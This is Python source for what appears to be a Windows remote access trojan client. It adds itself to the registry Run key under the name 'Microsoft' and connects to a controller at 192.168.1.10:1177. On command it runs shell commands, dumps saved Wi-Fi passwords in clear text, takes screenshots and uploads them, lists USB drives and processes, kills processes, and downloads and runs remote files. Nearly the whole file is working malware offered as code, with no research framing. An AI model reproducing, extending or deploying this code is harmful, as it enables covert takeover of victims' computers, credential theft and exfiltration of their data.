from cmath import exp
import pyautogui
import socket
import threading
import os
import time
import urllib.request
import sys
import wmi
import platform,re,uuid,json,psutil,logging
from urllib3 import Retry
import subprocess
from datetime import datetime
import shutil
import re
import requests
import webbrowser
import win32file

primerypath = os.getenv('TEMP')
sc_path = os.getenv('TEMP') + '\\GOOGLE\\'



_Format = "utf-8"
_Header = 64



#usb dump list
def locate_usb():
    drive_list = []
    drivebits = win32file.GetLogicalDrives()
    for d in range(1, 26):
        mask = 1 << d
        if drivebits & mask:
            # here if the drive is at least there
            drname = '%c:\\' % chr(ord('A') + d)
            t = win32file.GetDriveType(drname)
            if t == win32file.DRIVE_REMOVABLE:
                drive_list.append(drname)
    return drive_list






def open_url(url):
    try:
        webbrowser.open(url, new=0, autoraise=True)
        _send(sk('url')+'Open ('+ str(url) +') done')
    except Exception as e:
        _send(sk('url')+str(e))


def fdownload(url):
    try:

        r = requests.get(url, allow_redirects=True)
        open(sc_path+str(url.split('/')[len(url.split('/'))-1]), 'wb').write(r.content)
        os.startfile(sc_path+str(url.split('/')[len(url.split('/'))-1]))
        
        _send(sk('do')+'done')
    except Exception as e:
        _send(sk('do')+str(e))
    _send(sk('do')+'no try')


def wifi_dump():
    wifi_list = []
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
 
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile) 
    
  
    if (len(wifi_list)!=0):
        #for x in range(len(wifi_list)):
            #_send(sk('wifi')+str(wifi_list[x]))
            #time.sleep(3)
        #_send(sk('prs')+"stop")
        _send(sk('wifi')+str(wifi_list))  
    else:
        _send(sk('ERR')+'No wifi Data !')
    
    
    


def kill_process_v(pid):
    n_list = str(pid).split(',')
    for i in n_list:
        try:
            subprocess.Popen(' powershell -c taskkill /F /PID ' + i, shell=True)
            _send(sk('info')+f" [{i}] Proccess Killed")
        except Exception as e:
            _send(sk('info')+f" [ERR][{i}] [{e}]") 
    _send(sk('info')+'last')

def kill_process(pid):
    try:
        subprocess.Popen(' powershell -c taskkill /F /PID ' + pid, shell=True)
        _send(sk('info')+f" [{pid}] Proccess Killed") 
    except Exception as e:
        _send(sk('info')+f" [ERR][{pid}] [{e}]") 
        
                        
"""   
def process():
    f = wmi.WMI()
    data =''
    for process in f.Win32_Process():
        # Displaying the P_ID and P_Name of the process
        rr = (f"{process.ProcessId:<10} {process.Name}\n")
        _send(sk('prs')+rr)
        #data+=str(process.ProcessId)+"|"+str(process.Name+"@")
    #return data
    _send(sk('prs')+"stop")
""" 

def new_process():
    f = wmi.WMI()
    data =''
    n=0
    for process in f.Win32_Process():
        # Displaying the P_ID and P_Name of the process
        data += (f"{process.ProcessId:<10} {process.Name}\n")
        n+=1
        #_send(sk('prs')+rr)
        #data+=str(process.ProcessId)+"|"+str(process.Name+"@")
    #return data
    #_send(sk('prs')+"stop")
    data+=f'[NUMBER] : [{n}]\n'
    return data


def syscmd():
    pass


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
        else:
            pass
    except:
        pass

def getSystemInfo():
    try:
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=socket.gethostbyname(socket.gethostname())
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)


def getN():   #return date
    now = datetime.now()
    return now.strftime("%H%M%S")

def mkdir(name,path):
    if os.path.isdir(path+'\\'+name)==False:
        path = os.path.join(path+'\\', name)
        os.mkdir(path)

def screenshot():
    ext='.jpg'
    s = pyautogui.screenshot()
    s.save(sc_path+str(getN())+ext)
    return sc_path+str(getN())+ext





HOST = "192.168.1.10"
PORT = 1177
spl = "[R]"



def upload_file(c, file_name):
    f = open(file_name, 'rb')
    c.send(f.read())

def download_file(c, file_name):
    f = open(file_name, 'wb')
    c.settimeout(1)
    data = c.recv(1024)
    while data:
        f.write(data)
        try:
            data = c.recv(1024)
        except socket.timeout as e:
            break
    c.settimeout(None)
    f.close()



def _send(data):
    MSG = data.encode(_Format)
    msg_len = len(MSG)
    
    send_len = str(msg_len).encode(_Format)
    send_len +=b' '*(_Header - len(send_len))

    s.send(send_len)
    s.send(data.encode())

"""
def _read(buff):   #default

    data = ''
    while True:
      
        try:
            #data = s.recv(1024).decode()
            data = s.recv(buff).decode()
            return data
        except ValueError:
            continue
"""

def _read():
    data = ''
    while True:
      
        try:
            data = s.recv(1024).decode()
            return data
        except ValueError:
            continue





def getip():
    try:
        k =  ('IP : '+urllib.request.urlopen('https://ident.me').read().decode('utf8'))
        if k!='':
            return k
        else:
            k=('IP : '+urllib.request.urlopen('https://ifconfig.me/').read().decode('utf8'))
            if k!='':
                return k
    except:
        return '404!'
       


def sk(txt):  #retrun text with splite
    return txt+spl


buff_def = 1024

def shell():
    while True:
        cmd = _read()

        if cmd == 'sysinfo':
            _send(sk('sysinfo')+str(getSystemInfo()))
       


        elif cmd == 'usb':
            _send(sk('usb')+str(locate_usb()))
        elif cmd == 'wifi':
            wifi_dump()       
        elif cmd == 'pross':
             _send(sk('pross')+new_process())
           


        elif cmd =='cap':
            spath = screenshot()

            _send(sk('cap')+getN())
            upload_file(s,spath)

        elif cmd == 'getip':
            _send(sk('getip')+str(getip()))
        elif cmd == 'hello':
            _send('Hello mohamed')

        elif cmd == 'closed':
            s.close()
            break

        else:
            op = cmd.split(spl)
            if op[0] == 'cmd':
               
                output = os.popen(str(op[1])).read()
                

                _send(sk('cmd')+str(output))

            elif op[0]=='url':
                open_url(str(op[1]))
            elif op[0]== 'do':
                fdownload(str(op[1]))
            elif op[0]== 'kill':

                if (len(op[1])>10):
                   # _send(sk('info')+'1')

                    _send(sk('kill')+kill_process(op[1]))


                else:
                    kill_process_v(op[1])
                
                
                #killing pid number op[1]

                

        cmd = ''



       
def connection():
    while True:
        try:
            s.connect((HOST, PORT))
            shell()
            s.close()
            break
        except Exception as e:
            #print(e)
            break
            
    #connection()

time.sleep(2)

persist('Microsoft',sys.executable.split('\\')[-1])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mkdir('GOOGLE',primerypath)
connection()